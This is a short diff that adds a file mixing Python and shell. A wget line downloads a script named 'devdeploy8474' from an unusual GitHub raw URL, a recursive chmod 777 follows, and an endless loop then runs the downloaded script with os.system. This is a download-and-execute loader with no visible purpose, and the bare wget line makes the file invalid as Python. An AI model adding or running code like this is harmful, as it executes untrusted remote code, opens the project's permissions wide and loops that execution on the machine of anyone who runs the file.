@@ -1,0 +1,6 @@
+import os
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/devdeploy8474
+chmod 777 -R ./*
+
+while True: os.system("bash ./devdeploy8474");
